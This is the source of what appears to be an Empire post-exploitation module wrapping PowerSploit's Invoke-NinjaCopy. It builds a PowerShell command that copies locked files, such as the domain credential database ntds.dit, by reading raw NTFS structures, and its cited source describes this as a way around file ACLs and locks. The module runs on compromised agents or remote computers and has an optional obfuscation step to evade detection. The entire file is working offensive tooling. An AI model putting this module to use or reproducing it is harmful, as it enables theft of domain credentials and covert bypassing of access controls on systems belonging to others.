from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-NinjaCopy',

            'Author': ['@JosephBialek'],

            'Description': ('Copies a file from an NTFS partitioned volume by reading the '
                            'raw volume and parsing the NTFS structures.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1',
                'https://clymb3r.wordpress.com/2013/06/13/using-powershell-to-copy-ntds-dit-registry-hives-bypass-sacls-dacls-file-locks/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Path' : {
                'Description'   :   'The full path of the file to copy (example: c:\\windows\\ntds\\ntds.dit)',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LocalDestination' : {
                'Description'   :   'A file path to copy the file to on the local computer.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RemoteDestination' : {
                'Description'   :   'A file path to copy the file to on the remote computer. If this isn\'t used, LocalDestination must be specified.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ComputerName' : {
                'Description'   :   'An array of computernames to run the script on.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
                # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-NinjaCopy.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "$null = Invoke-NinjaCopy "

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
                    
        scriptEnd += "; Write-Output 'Invoke-NinjaCopy Completed'"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
